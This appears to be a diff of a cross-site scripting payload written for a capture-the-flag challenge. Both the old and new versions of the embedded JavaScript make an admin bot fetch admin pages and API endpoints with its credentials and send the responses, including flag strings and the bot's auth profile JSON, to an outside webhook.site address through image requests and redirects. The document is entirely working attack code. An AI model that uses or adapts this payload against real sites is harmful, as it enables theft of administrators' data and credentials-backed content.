@@ -4,27 +4,39 @@
     <script>
         const webh = "https://webhook.site/eea9d67e-7379-46ca-b85a-c69dad2bf391";
         
-        async function capture() {
-            // Path 1: The general contacts list (where we saw the bot earlier)
-            // Path 2: The specific message detail (trying a different potential path)
-            const paths = ["/admin/contacts", "/admin/messages"];
-            
-            for (let path of paths) {
+        async function bruteForcePaths() {
+            // These are the most likely paths for Flag 5 based on common Hash Academy patterns
+            const targets = [
+                "/admin/dashboard",
+                "/admin/messages/all",
+                "/admin/settings",
+                "/api/admin/flag",
+                "/api/admin/stats"
+            ];
+
+            for (let path of targets) {
                 try {
-                    const r = await fetch(path);
-                    const html = await r.text();
-                    // Send a "heartbeat" to the webhook for each path
-                    new Image().src = `${webh}/log?path=${btoa(path)}&data=${btoa(unescape(encodeURIComponent(html.substring(0, 3000))))}`;
+                    const r = await fetch(path, { credentials: 'include' });
+                    const text = await r.text();
+                    
+                    // If the response contains "HASH{", we win. 
+                    // Send it immediately.
+                    if (text.includes("HASH{")) {
+                        new Image().src = `${webh}/winner?p=${path}&data=${btoa(text.substring(text.indexOf("HASH{"), text.indexOf("HASH{") + 50))}`;
+                    } else {
+                        // Otherwise, just log that we checked it
+                        new Image().src = `${webh}/check?path=${btoa(path)}&status=${r.status}`;
+                    }
                 } catch(e) {}
             }
 
-            // Finally, redirect the bot to show the current page it's actually on
-            // This helps us see if the admin is looking at a "secret" URL
-            setTimeout(() => {
-                location.href = webh + "?final_url=" + btoa(window.location.href) + "&html=" + btoa(unescape(encodeURIComponent(document.body.innerHTML.substring(0,3000))));
-            }, 2000);
+            // Fallback: Leak the Bot's own internal profile JSON
+            fetch('/api/auth/profile').then(r => r.text()).then(d => {
+                location.href = webh + "?bot_profile=" + btoa(d);
+            });
         }
-        capture();
+
+        bruteForcePaths();
     </script>
 </body>
 </html>
